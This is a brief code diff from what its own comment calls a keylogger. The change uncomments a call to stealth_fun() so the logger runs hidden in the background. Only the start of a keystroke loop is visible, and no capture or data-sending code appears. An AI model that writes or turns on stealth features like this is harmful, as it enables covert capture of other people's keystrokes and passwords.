@@ -13,7 +13,7 @@ void stealth_fun();
 int main() {
     //to run keyllogger in background 
 
-    //stealth_fun(); 
+    stealth_fun(); 
 
     while(true) {
         // asci code 
